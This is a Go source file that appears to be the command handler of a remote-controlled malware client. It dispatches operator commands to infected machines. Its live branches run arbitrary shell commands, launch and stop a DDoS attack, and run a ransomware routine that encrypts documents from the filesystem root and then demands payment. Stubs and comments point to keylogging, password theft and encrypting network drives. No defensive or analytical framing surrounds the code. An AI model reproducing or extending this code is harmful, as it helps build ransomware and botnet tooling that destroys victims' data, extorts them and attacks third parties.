package main

func Execute(command string, target string, args string) {
	if target == "*" || target == GetUsername() {
		switch command {
		case "cmd":
			Run(args)
		case "off":
			break
		case "lo":
			break
		case "kill":
			break
		case "msg":
			break
		case "web":
			break
		case "ddos":
			DdosApi(100, args)
		case "sdd":
			StopDdos()
		case "pass":
			break
		case "upgrade":
			break
		case "uninstall":
			break
		case "start-keylogger":
			break
		case "keylog":
			break
			//Send("res", KeyLogs)
		case "ransom":
			EncryptDocumets("/", true)
			//Encrypt net drives

			// Once encrypted
			//WriteRegDone()
			// Write done to pastebin
			PromtPay()

			//ListenForPayment()

		default:
			Send("res", "Not a command")
		}
	}
}
